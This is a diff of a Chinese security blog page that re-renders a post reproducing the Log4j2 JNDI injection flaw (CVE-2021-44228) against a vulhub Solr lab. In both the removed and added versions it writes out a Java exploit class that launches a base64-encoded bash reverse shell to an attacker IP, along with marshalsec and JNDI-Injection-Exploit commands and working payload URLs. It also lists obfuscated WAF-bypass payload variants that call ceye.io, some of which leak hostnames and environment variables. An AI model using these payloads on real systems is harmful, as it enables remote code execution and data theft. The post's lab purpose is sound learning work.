@@ -20,20 +20,36 @@
     var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"manual","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
   </script>
 
-  <meta name="description" content="# log4j2  # 什么是log4j2  Log4j2是Apache的一个开源项目，通过使用Log4j2，我们可以控制日志信息输送的目的地是控制台、文件、GUI组件，甚至是套接口服务器、NT的事件记录器、UNIX Syslog守护进程等；我们也可以控制每一条日志的输出格式；通过定义每一条日志信息的级别，我们能够更加细致地控制日志的生成过程。  这些可以通过一个配置文件来灵活地进行配置，而不需">
+  <meta name="description" content="什么是log4j2 Log4j2是Apache的一个开源项目，通过使用Log4j2，我们可以控制日志信息输送的目的地是控制台、文件、GUI组件，甚至是套接口服务器、NT的事件记录器、UNIX Syslog守护进程等；我们也可以控制每一条日志的输出格式；通过定义每一条日志信息的级别，我们能够更加细致地…">
 <meta property="og:type" content="article">
 <meta property="og:title" content="log4j2">
 <meta property="og:url" content="http://example.com/2026/09/16/09-log4j2/index.html">
 <meta property="og:site_name" content="Glut4micum">
-<meta property="og:description" content="# log4j2  # 什么是log4j2  Log4j2是Apache的一个开源项目，通过使用Log4j2，我们可以控制日志信息输送的目的地是控制台、文件、GUI组件，甚至是套接口服务器、NT的事件记录器、UNIX Syslog守护进程等；我们也可以控制每一条日志的输出格式；通过定义每一条日志信息的级别，我们能够更加细致地控制日志的生成过程。  这些可以通过一个配置文件来灵活地进行配置，而不需">
+<meta property="og:description" content="什么是log4j2 Log4j2是Apache的一个开源项目，通过使用Log4j2，我们可以控制日志信息输送的目的地是控制台、文件、GUI组件，甚至是套接口服务器、NT的事件记录器、UNIX Syslog守护进程等；我们也可以控制每一条日志的输出格式；通过定义每一条日志信息的级别，我们能够更加细致地…">
 <meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/yuque-notes/02-Knowledge%20Book/assets/6341d5f1-image.png">
+<meta property="og:image" content="http://example.com/yuque-notes/02-Knowledge%20Book/assets/5df21813-image.png">
+<meta property="og:image" content="http://example.com/yuque-notes/02-Knowledge%20Book/assets/e723cb5c-image.png">
+<meta property="og:image" content="http://example.com/yuque-notes/02-Knowledge%20Book/assets/32bf2f8f-image.png">
+<meta property="og:image" content="http://example.com/yuque-notes/02-Knowledge%20Book/assets/ea6dbbf3-image.png">
+<meta property="og:image" content="http://example.com/yuque-notes/02-Knowledge%20Book/assets/52bec4eb-image.png">
+<meta property="og:image" content="http://example.com/yuque-notes/02-Knowledge%20Book/assets/f4d59255-image.png">
+<meta property="og:image" content="http://example.com/yuque-notes/02-Knowledge%20Book/assets/1db0123c-image.png">
+<meta property="og:image" content="http://example.com/yuque-notes/02-Knowledge%20Book/assets/a9a9b23c-image.png">
+<meta property="og:image" content="http://example.com/yuque-notes/02-Knowledge%20Book/assets/5fa3ed54-image.png">
+<meta property="og:image" content="http://example.com/yuque-notes/02-Knowledge%20Book/assets/1f177781-image.png">
+<meta property="og:image" content="http://example.com/yuque-notes/02-Knowledge%20Book/assets/442f76fe-image.png">
+<meta property="og:image" content="http://example.com/yuque-notes/02-Knowledge%20Book/assets/dc18f781-image.png">
+<meta property="og:image" content="http://example.com/yuque-notes/02-Knowledge%20Book/assets/00a0ce9f-image.png">
+<meta property="og:image" content="http://example.com/yuque-notes/02-Knowledge%20Book/assets/93cd22b9-image.png">
 <meta property="article:published_time" content="2026-09-16T13:58:17.000Z">
 <meta property="article:modified_time" content="2026-09-16T13:58:17.000Z">
 <meta property="article:author" content="谷氨酸棒状杆菌">
-<meta property="article:tag" content="Web安全">
-<meta property="article:tag" content="CTF">
-<meta property="article:tag" content="学习笔记">
+<meta property="article:tag" content="Log4j2">
+<meta property="article:tag" content="漏洞复现">
+<meta property="article:tag" content="RCE">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/yuque-notes/02-Knowledge%20Book/assets/6341d5f1-image.png">
 
 <link rel="canonical" href="http://example.com/2026/09/16/09-log4j2/">
 
@@ -235,6 +251,7 @@
               <span class="post-meta-item-text">阅读次数：</span>
               <span id="busuanzi_value_page_pv"></span>
             </span>
+            <div class="post-description">什么是log4j2 Log4j2是Apache的一个开源项目，通过使用Log4j2，我们可以控制日志信息输送的目的地是控制台、文件、GUI组件，甚至是套接口服务器、NT的事件记录器、UNIX Syslog守护进程等；我们也可以控制每一条日志的输出格式；通过定义每一条日志信息的级别，我们能够更加细致地…</div>
 
         </div>
       </header>
@@ -245,138 +262,68 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        
-# log4j2
-
-# 什么是log4j2
-
-Log4j2是Apache的一个开源项目，通过使用Log4j2，我们可以控制日志信息输送的目的地是控制台、文件、GUI组件，甚至是套接口服务器、NT的事件记录器、UNIX Syslog守护进程等；我们也可以控制每一条日志的输出格式；通过定义每一条日志信息的级别，我们能够更加细致地控制日志的生成过程。
-
-这些可以通过一个配置文件来灵活地进行配置，而不需要修改应用的代码
-
-# log4j2 jndi注入复现(CVE-2021-44228)
-
-利用是搭建的vulhub靶场
-
+        <h1 id="log4j2"><a href="#log4j2" class="headerlink" title="log4j2"></a>log4j2</h1><h1 id="什么是log4j2"><a href="#什么是log4j2" class="headerlink" title="什么是log4j2"></a>什么是log4j2</h1><p>Log4j2是Apache的一个开源项目，通过使用Log4j2，我们可以控制日志信息输送的目的地是控制台、文件、GUI组件，甚至是套接口服务器、NT的事件记录器、UNIX Syslog守护进程等；我们也可以控制每一条日志的输出格式；通过定义每一条日志信息的级别，我们能够更加细致地控制日志的生成过程。</p>
+<p>这些可以通过一个配置文件来灵活地进行配置，而不需要修改应用的代码</p>
+<h1 id="log4j2-jndi注入复现-CVE-2021-44228"><a href="#log4j2-jndi注入复现-CVE-2021-44228" class="headerlink" title="log4j2 jndi注入复现(CVE-2021-44228)"></a>log4j2 jndi注入复现(CVE-2021-44228)</h1><p>利用是搭建的vulhub靶场</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">git clone https:<span class="comment">//github.com/vulhub/vulhub.git//拉取镜像</span></span><br><span class="line"><span class="comment">//然后进入vulhb目录就可以看到不同的漏洞了</span></span><br><span class="line">进入log4j/CVE-<span class="number">2021</span>-<span class="number">44228</span></span><br><span class="line">docker-compose up -d<span class="comment">//开启靶场</span></span><br><span class="line">docker-compose ps<span class="comment">//查看端口号</span></span><br><span class="line">ifconfig查看IP后加上端口号就进入了</span><br><span class="line"></span><br><span class="line">文件路径在/usr/local</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
-![image.png](/yuque-notes/02-Knowledge Book/assets/6341d5f1-image.png)
-
-接下来进行漏洞探测
-
-![image.png](/yuque-notes/02-Knowledge Book/assets/5df21813-image.png)
-
-url上面发同样的payload不知道为什么dnslog没有反应，换了一种方法，利用工具postman来发
-
-​
-
-![image.png](/yuque-notes/02-Knowledge Book/assets/e723cb5c-image.png)
-
-回显了Java的版本1.8.0_102，这样我们就可以探测出是存在漏洞点的，payload：`?action=${jndi:ldap://${sys:java.version}.7zw40l.dnslog.cn}`
-
-## 漏洞利用
-
-打反弹shell
-
-![image.png](/yuque-notes/02-Knowledge Book/assets/32bf2f8f-image.png)
-
-对命令进行编码
-
-[bookmarklink]
-
-## 法1，Java反序列化
-
-然后就可以写我们的exp
-
+<p><img src="/yuque-notes/02-Knowledge%20Book/assets/6341d5f1-image.png" alt="image.png"></p>
+<p>接下来进行漏洞探测</p>
+<p><img src="/yuque-notes/02-Knowledge%20Book/assets/5df21813-image.png" alt="image.png"></p>
+<p>url上面发同样的payload不知道为什么dnslog没有反应，换了一种方法，利用工具postman来发</p>
+<p>​</p>
+<p><img src="/yuque-notes/02-Knowledge%20Book/assets/e723cb5c-image.png" alt="image.png"></p>
+<p>回显了Java的版本1.8.0_102，这样我们就可以探测出是存在漏洞点的，payload：<code>?action=${jndi:ldap://${sys:java.version}.7zw40l.dnslog.cn}</code></p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>打反弹shell</p>
+<p><img src="/yuque-notes/02-Knowledge%20Book/assets/32bf2f8f-image.png" alt="image.png"></p>
+<p>对命令进行编码</p>
+<p>[bookmarklink]</p>
+<h2 id="法1，Java反序列化"><a href="#法1，Java反序列化" class="headerlink" title="法1，Java反序列化"></a>法1，Java反序列化</h2><p>然后就可以写我们的exp</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Exp</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Exp</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTguMjMuMTQ4LjUxLzc3NzcgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] argv)</span>&#123;</span><br><span class="line">        <span class="type">Exp</span> <span class="variable">e</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Exp</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-![image.png](/yuque-notes/02-Knowledge Book/assets/ea6dbbf3-image.png)
-
-将编写好的脚本上传到攻击机上去
-
-![image.png](/yuque-notes/02-Knowledge Book/assets/52bec4eb-image.png)
-
-进入我们存放class文件的目录下，运行python3 -m http.server 4444，将class文件映射出来
-
-![image.png](/yuque-notes/02-Knowledge Book/assets/f4d59255-image.png)
-
-下载工具编译jar包
-
-`git clone https://github.com/mbechler/marshalsec.git`
-
-进入marshalsec目录，运行`mvn clean package -Dmaven.test.skip=true`
-
-进入target文件中运行下面的命令
-
-使用marshalsec工具，开启RMI服务，监听1389端口，并指向我们恶意代码文件地址
-
+<p><img src="/yuque-notes/02-Knowledge%20Book/assets/ea6dbbf3-image.png" alt="image.png"></p>
+<p>将编写好的脚本上传到攻击机上去</p>
+<p><img src="/yuque-notes/02-Knowledge%20Book/assets/52bec4eb-image.png" alt="image.png"></p>
+<p>进入我们存放class文件的目录下，运行python3 -m http.server 4444，将class文件映射出来</p>
+<p><img src="/yuque-notes/02-Knowledge%20Book/assets/f4d59255-image.png" alt="image.png"></p>
+<p>下载工具编译jar包</p>
+<p><code>git clone https://github.com/mbechler/marshalsec.git</code></p>
+<p>进入marshalsec目录，运行<code>mvn clean package -Dmaven.test.skip=true</code></p>
+<p>进入target文件中运行下面的命令</p>
+<p>使用marshalsec工具，开启RMI服务，监听1389端口，并指向我们恶意代码文件地址</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp marshalsec-<span class="number">0.0</span><span class="number">.3</span>-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer  <span class="string">&quot;http://198.23.148.51:4444/#Exp&quot;</span> <span class="number">1389</span></span><br></pre></td></tr></table></figure>
 
-payload`http://198.23.148.51:8983/solr/admin/cores?action=${jndi:ldap://198.23.148.51:1389/Exp}`GET传参即可
-
-![image.png](/yuque-notes/02-Knowledge Book/assets/1db0123c-image.png)
-
-监听反弹shell端口
-
-![image.png](/yuque-notes/02-Knowledge Book/assets/a9a9b23c-image.png)
-
-ldap监听情况
-
-![image.png](/yuque-notes/02-Knowledge Book/assets/5fa3ed54-image.png)
-
-开放的4444端口情况
-
-![image.png](/yuque-notes/02-Knowledge Book/assets/1f177781-image.png)
-
-反弹shell也收到了
-
-![image.png](/yuque-notes/02-Knowledge Book/assets/442f76fe-image.png)
-
-## 法2
-
-`git clone https://github.com/welk1n/JNDI-Injection-Exploit.git`
-
-利用工具JNDI-Injection-Exploit，在虚拟机上面下载好，环境需求Java，Maven
-
-然后配置好环境，安装好后进入JNDI-Injection-Exploit文件内，运行命令`mvn clean package -DskipTests`，在target文件夹生成.jar文件
-
+<p>payload<code>http://198.23.148.51:8983/solr/admin/cores?action=${jndi:ldap://198.23.148.51:1389/Exp}</code>GET传参即可</p>
+<p><img src="/yuque-notes/02-Knowledge%20Book/assets/1db0123c-image.png" alt="image.png"></p>
+<p>监听反弹shell端口</p>
+<p><img src="/yuque-notes/02-Knowledge%20Book/assets/a9a9b23c-image.png" alt="image.png"></p>
+<p>ldap监听情况</p>
+<p><img src="/yuque-notes/02-Knowledge%20Book/assets/5fa3ed54-image.png" alt="image.png"></p>
+<p>开放的4444端口情况</p>
+<p><img src="/yuque-notes/02-Knowledge%20Book/assets/1f177781-image.png" alt="image.png"></p>
+<p>反弹shell也收到了</p>
+<p><img src="/yuque-notes/02-Knowledge%20Book/assets/442f76fe-image.png" alt="image.png"></p>
+<h2 id="法2"><a href="#法2" class="headerlink" title="法2"></a>法2</h2><p><code>git clone https://github.com/welk1n/JNDI-Injection-Exploit.git</code></p>
+<p>利用工具JNDI-Injection-Exploit，在虚拟机上面下载好，环境需求Java，Maven</p>
+<p>然后配置好环境，安装好后进入JNDI-Injection-Exploit文件内，运行命令<code>mvn clean package -DskipTests</code>，在target文件夹生成.jar文件</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">原命令</span><br><span class="line">java -jar JNDI-Injection-Exploit-<span class="number">1.0</span>-SNAPSHOT-all.jar -C <span class="string">&quot;转化后的bash编码命令&quot;</span> -A <span class="string">&quot;攻击机/监听机/本机&quot;</span></span><br><span class="line"> </span><br><span class="line">反弹shell的命令（编码前）</span><br><span class="line">bash -i &gt;&amp; /dev/tcp/<span class="number">198.23</span><span class="number">.148</span><span class="number">.51</span>/<span class="number">7777</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span></span><br><span class="line">反弹shell的命令（编码后）</span><br><span class="line">bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTguMjMuMTQ4LjUxLzc3NzcgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</span><br><span class="line"></span><br><span class="line">java -jar JNDI-Injection-Exploit-<span class="number">1.0</span>-SNAPSHOT-all.jar -C <span class="string">&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTguMjMuMTQ4LjUxLzc3NzcgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span> -A <span class="string">&quot;198.23.148.51&quot;</span></span><br></pre></td></tr></table></figure>
 
-![image.png](/yuque-notes/02-Knowledge Book/assets/dc18f781-image.png)
+<p><img src="/yuque-notes/02-Knowledge%20Book/assets/dc18f781-image.png" alt="image.png"></p>
+<p>payload：访问<code>http://198.23.148.51:8983/solr/admin/cores?action=${jndi:rmi://198.23.148.51:1099/br9bad}</code>&#x2F;&#x2F;选择这个的原因是我们一开始dns得到的版本是JDK1.8</p>
+<p>或者<code>http://198.23.148.51:8983/solr/admin/cores?action=${jndi:ldap://198.23.148.51:1099/br9bad}</code></p>
+<p><img src="/yuque-notes/02-Knowledge%20Book/assets/00a0ce9f-image.png" alt="image.png"></p>
+<p><img src="/yuque-notes/02-Knowledge%20Book/assets/93cd22b9-image.png" alt="image.png"></p>
+<p>成功获取shell</p>
+<h1 id="log4j解析-存在递归操作实现绕过防火墙"><a href="#log4j解析-存在递归操作实现绕过防火墙" class="headerlink" title="log4j解析${}存在递归操作实现绕过防火墙"></a>log4j解析${}存在递归操作实现绕过防火墙</h1><p>假如传入的是${11111${222222}333333}，他会先执行${222222}然后将数据替换回去，变成${11111XXXXXX333333}来继续执行，所以执行的顺序是从里到外</p>
+<p>可以通过log4j2的代码特性来实现对防火墙的绕过操作</p>
+<h2 id="相关变形payload"><a href="#相关变形payload" class="headerlink" title="相关变形payload"></a>相关变形payload</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$&#123;jndi:ldap:<span class="comment">//127.0.0.1:1389/a&#125;</span></span><br><span class="line">$&#123;$&#123;::-j&#125;$&#123;::-n&#125;$&#123;::-d&#125;$&#123;::-i&#125;:$&#123;::-r&#125;$&#123;::-m&#125;$&#123;::-i&#125;:<span class="comment">//ceye.io/a&#125;</span></span><br><span class="line">$&#123;$&#123;::-j&#125;ndi:rmi:<span class="comment">//ceye.io/a&#125;</span></span><br><span class="line">$&#123;jndi:rmi:<span class="comment">//ceye.io&#125;</span></span><br><span class="line">$&#123;$&#123;lower:jndi&#125;:$&#123;lower:rmi&#125;:<span class="comment">//ceye.io/a&#125;</span></span><br><span class="line">$&#123;$&#123;lower:$&#123;lower:jndi&#125;&#125;:$&#123;lower:rmi&#125;:<span class="comment">//ceye.io/a&#125;</span></span><br><span class="line">$&#123;$&#123;lower:j&#125;$&#123;lower:n&#125;$&#123;lower:d&#125;i:$&#123;lower:rmi&#125;:<span class="comment">//ceye.io/a&#125;</span></span><br><span class="line">$&#123;$&#123;lower:j&#125;$&#123;upper:n&#125;$&#123;lower:d&#125;$&#123;upper:i&#125;:$&#123;lower:r&#125;m$&#123;lower:i&#125;&#125;:<span class="comment">//ceye.io/a&#125;</span></span><br><span class="line">$&#123;$&#123;upper:jndi&#125;:$&#123;upper:rmi&#125;:<span class="comment">//ceye.io/a&#125;</span></span><br><span class="line">$&#123;$&#123;upper:j&#125;$&#123;upper:n&#125;$&#123;lower:d&#125;i:$&#123;upper:rmi&#125;:<span class="comment">//ceye.io/a&#125;</span></span><br><span class="line">$&#123;$&#123;upper:j&#125;$&#123;upper:n&#125;$&#123;upper:d&#125;$&#123;upper:i&#125;:$&#123;lower:r&#125;m$&#123;lower:i&#125;&#125;:<span class="comment">//ceye.io/a&#125;</span></span><br><span class="line">$&#123;$&#123;::-j&#125;$&#123;::-n&#125;$&#123;::-d&#125;$&#123;::-i&#125;:$&#123;::-l&#125;$&#123;::-d&#125;$&#123;::-a&#125;$&#123;::-p&#125;:<span class="comment">//$&#123;hostName&#125;.ceye.io&#125;</span></span><br><span class="line">$&#123;$&#123;upper::-j&#125;$&#123;upper::-n&#125;$&#123;::-d&#125;$&#123;upper::-i&#125;:$&#123;upper::-l&#125;$&#123;upper::-d&#125;$&#123;upper::-a&#125;$&#123;upper::-p&#125;:<span class="comment">//$&#123;hostName&#125;.ceye.io&#125;</span></span><br><span class="line">$&#123;$&#123;::-j&#125;$&#123;::-n&#125;$&#123;::-d&#125;$&#123;::-i&#125;:$&#123;::-l&#125;$&#123;::-d&#125;$&#123;::-a&#125;$&#123;::-p&#125;:<span class="comment">//$&#123;hostName&#125;.$&#123;env:COMPUTERNAME&#125;.$&#123;env:USERDOMAIN&#125;.$&#123;env&#125;.ceye.io</span></span><br></pre></td></tr></table></figure>
 
-payload：访问`http://198.23.148.51:8983/solr/admin/cores?action=${jndi:rmi://198.23.148.51:1099/br9bad}`//选择这个的原因是我们一开始dns得到的版本是JDK1.8
-
-或者`http://198.23.148.51:8983/solr/admin/cores?action=${jndi:ldap://198.23.148.51:1099/br9bad}`
-
-![image.png](/yuque-notes/02-Knowledge Book/assets/00a0ce9f-image.png)
-
-![image.png](/yuque-notes/02-Knowledge Book/assets/93cd22b9-image.png)
-
-成功获取shell
-
-# log4j解析${}存在递归操作实现绕过防火墙
-
-假如传入的是${11111${222222}333333}，他会先执行${222222}然后将数据替换回去，变成${11111XXXXXX333333}来继续执行，所以执行的顺序是从里到外
-
-可以通过log4j2的代码特性来实现对防火墙的绕过操作
-
-## 相关变形payload
-
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$&#123;jndi:ldap:<span class="comment">//127.0.0.1:1389/a&#125;</span></span><br><span class="line">$&#123;$&#123;::-j&#125;$&#123;::-n&#125;$&#123;::-d&#125;$&#123;::-i&#125;:$&#123;::-r&#125;$&#123;::-m&#125;$&#123;::-i&#125;:<span class="comment">//ceye.io/a&#125;</span></span><br><span class="line">$&#123;$&#123;::-j&#125;ndi:rmi:<span class="comment">//ceye.io/a&#125;</span></span><br><span class="line">$&#123;jndi:rmi:<span class="comment">//ceye.io&#125;</span></span><br><span class="line">$&#123;$&#123;lower:jndi&#125;:$&#123;lower:rmi&#125;:<span class="comment">//ceye.io/a&#125;</span></span><br><span class="line">$&#123;$&#123;lower:$&#123;lower:jndi&#125;&#125;:$&#123;lower:rmi&#125;:<span class="comment">//ceye.io/a&#125;</span></span><br><span class="line">$&#123;$&#123;lower:j&#125;$&#123;lower:n&#125;$&#123;lower:d&#125;i:$&#123;lower:rmi&#125;:<span class="comment">//ceye.io/a&#125;</span></span><br><span class="line">$&#123;$&#123;lower:j&#125;$&#123;upper:n&#125;$&#123;lower:d&#125;$&#123;upper:i&#125;:$&#123;lower:r&#125;m$&#123;lower:i&#125;&#125;:<span class="comment">//ceye.io/a&#125;</span></span><br><span class="line">$&#123;$&#123;upper:jndi&#125;:$&#123;upper:rmi&#125;:<span class="comment">//ceye.io/a&#125;</span></span><br><span class="line">$&#123;$&#123;upper:j&#125;$&#123;upper:n&#125;$&#123;lower:d&#125;i:$&#123;upper:rmi&#125;:<span class="comment">//ceye.io/a&#125;</span></span><br><span class="line">$&#123;$&#123;upper:j&#125;$&#123;upper:n&#125;$&#123;upper:d&#125;$&#123;upper:i&#125;:$&#123;lower:r&#125;m$&#123;lower:i&#125;&#125;:<span class="comment">//ceye.io/a&#125;</span></span><br><span class="line">$&#123;$&#123;::-j&#125;$&#123;::-n&#125;$&#123;::-d&#125;$&#123;::-i&#125;:$&#123;::-l&#125;$&#123;::-d&#125;$&#123;::-a&#125;$&#123;::-p&#125;:<span class="comment">//$&#123;hostName&#125;.ceye.io&#125;</span></span><br><span class="line">$&#123;$&#123;upper::-j&#125;$&#123;upper::-n&#125;$&#123;::-d&#125;$&#123;upper::-i&#125;:$&#123;upper::-l&#125;$&#123;upper::-d&#125;$&#123;upper::-a&#125;$&#123;upper::-p&#125;:<span class="comment">//$&#123;hostName&#125;.ceye.io&#125;</span></span><br><span class="line">$&#123;$&#123;::-j&#125;$&#123;::-n&#125;$&#123;::-d&#125;$&#123;::-i&#125;:$&#123;::-l&#125;$&#123;::-d&#125;$&#123;::-a&#125;$&#123;::-p&#125;:<span class="comment">//$&#123;hostName&#125;.$&#123;env:COMPUTERNAME&#125;.$&#123;env:USERDOMAIN&#125;.$&#123;env&#125;.ceye.io</span></span><br></pre></td></tr></table></figure>
-
-来看一下这个例子的解析`${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://ceye.io/a}`
-
-从里到外，因此会先执行`${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://ceye.io/a`,接着就是递归调用，处理`${::-j}`,`${::-n}`这样的字符串
-
-传入的就是`::-j`，由于他没有了相关的标识符`${}`，所以就直接进行了解析操作，因为`:-`作为分隔，所以主键是`:`,值是`j`，接着就会把`${::-j}`字符串替换为`j`，以此类推，最终获得的字符串就是`jndi:rmi://ceye.io/a`
-
-​
-
----
-
-来源: https://www.yuque.com/guansuanbangzhuangganjun/oxmbxg/tgmkudnrof4tahvl
-语雀文档ID: 191953074
-
+<p>来看一下这个例子的解析<code>${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://ceye.io/a}</code></p>
+<p>从里到外，因此会先执行<code>${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://ceye.io/a</code>,接着就是递归调用，处理<code>${::-j}</code>,<code>${::-n}</code>这样的字符串</p>
+<p>传入的就是<code>::-j</code>，由于他没有了相关的标识符<code>${}</code>，所以就直接进行了解析操作，因为<code>:-</code>作为分隔，所以主键是<code>:</code>,值是<code>j</code>，接着就会把<code>${::-j}</code>字符串替换为<code>j</code>，以此类推，最终获得的字符串就是<code>jndi:rmi://ceye.io/a</code></p>
+<p>​</p>
+<hr>
+<p>来源: <a target="_blank" rel="noopener" href="https://www.yuque.com/guansuanbangzhuangganjun/oxmbxg/tgmkudnrof4tahvl">https://www.yuque.com/guansuanbangzhuangganjun/oxmbxg/tgmkudnrof4tahvl</a><br>语雀文档ID: 191953074</p>
 
     </div>
 
@@ -386,9 +333,9 @@ payload：访问`http://198.23.148.51:8983/solr/admin/cores?action=${jndi:rmi://
 
       <footer class="post-footer">
           <div class="post-tags">
-              <a href="/tags/Web%E5%AE%89%E5%85%A8/" rel="tag"># Web安全</a>
-              <a href="/tags/CTF/" rel="tag"># CTF</a>
-              <a href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" rel="tag"># 学习笔记</a>
+              <a href="/tags/Log4j2/" rel="tag"># Log4j2</a>
+              <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" rel="tag"># 漏洞复现</a>
+              <a href="/tags/RCE/" rel="tag"># RCE</a>
           </div>
 
         
@@ -462,6 +409,7 @@ payload：访问`http://198.23.148.51:8983/solr/admin/cores?action=${jndi:rmi://
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#log4j2"><span class="nav-number">1.</span> <span class="nav-text">log4j2</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFlog4j2"><span class="nav-number">2.</span> <span class="nav-text">什么是log4j2</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#log4j2-jndi%E6%B3%A8%E5%85%A5%E5%A4%8D%E7%8E%B0-CVE-2021-44228"><span class="nav-number">3.</span> <span class="nav-text">log4j2 jndi注入复现(CVE-2021-44228)</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-number">3.1.</span> <span class="nav-text">漏洞利用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B3%951%EF%BC%8CJava%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-number">3.2.</span> <span class="nav-text">法1，Java反序列化</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B3%952"><span class="nav-number">3.3.</span> <span class="nav-text">法2</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#log4j%E8%A7%A3%E6%9E%90-%E5%AD%98%E5%9C%A8%E9%80%92%E5%BD%92%E6%93%8D%E4%BD%9C%E5%AE%9E%E7%8E%B0%E7%BB%95%E8%BF%87%E9%98%B2%E7%81%AB%E5%A2%99"><span class="nav-number">4.</span> <span class="nav-text">log4j解析${}存在递归操作实现绕过防火墙</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%9B%B8%E5%85%B3%E5%8F%98%E5%BD%A2payload"><span class="nav-number">4.1.</span> <span class="nav-text">相关变形payload</span></a></li></ol></li></ol></div>
       </div>
       <!--/noindex-->
 
@@ -477,7 +425,7 @@ payload：访问`http://198.23.148.51:8983/solr/admin/cores?action=${jndi:rmi://
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">72</span>
+          <span class="site-state-item-count">64</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -490,7 +438,7 @@ payload：访问`http://198.23.148.51:8983/solr/admin/cores?action=${jndi:rmi://
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">4</span>
